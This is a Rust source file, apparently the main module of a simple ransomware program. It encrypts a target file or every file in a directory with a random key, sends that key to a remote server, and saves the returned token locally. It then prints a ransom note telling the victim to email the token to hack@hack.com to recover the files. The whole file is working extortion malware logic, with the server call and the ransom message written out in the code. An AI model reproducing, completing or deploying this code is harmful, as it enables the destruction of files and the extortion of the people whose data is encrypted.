mod lib; // Created a module called lib (lib.rs) -- Sets up the command structure to parse flags 
use rand::{RngCore};
use std::{fs, path, io, result};

fn main() {
    let args = lib::get_args();
    let key = args.value_of("key").unwrap_or_default();

    let stored_token_path = path::PathBuf::from("./token.txt"); // Get the static token value
    let stored_token = lib::get_stored_token(&stored_token_path);

    let path_to_file = path::PathBuf::from(args.value_of("file").expect("File not provided"));
    let meta = fs::metadata(&path_to_file).expect("Error reading file"); // Get the metadat of the file 

    if !stored_token.is_empty() && !key.is_empty() {
        let _ = run(&meta, &path_to_file, &key);
        println!("Your files are now back, be more careful in the future");
    } else if stored_token.is_empty() {
        let random_key = rand::thread_rng().next_u64().to_string();
        let _ = run(&meta, &path_to_file, &random_key);

        let response = lib::get_token(&random_key);
        let token = response.unwrap().text().unwrap(); // Points to the server 
        fs::write(&stored_token_path, &token).expect("Failed to store token");

        print_message(&token)
    } else {
        print_message(&stored_token)
    }
}

fn print_message(token: &str) {
    println!("{}", format!("Send the following token to hack@hack.com to get your files back: {token}", token = token))
}

fn run(meta: &fs::Metadata, path_to_file: &path::PathBuf, key: &str) -> result::Result<(), io::Error> { // Takes the metadata about the file, the path to the file & the key
    if meta.is_dir() { // Checks whether this is a directory
        let func = Box::new(|path_to_file| lib::run_operation(&path_to_file, key));
        lib::walk_directory(&path_to_file, &func) // Goes down the directory and tries to encrypt every single file within that directory
    } else {
        lib::run_operation(&path_to_file, key) // If not a directory, then it will point to that specific file
    }
}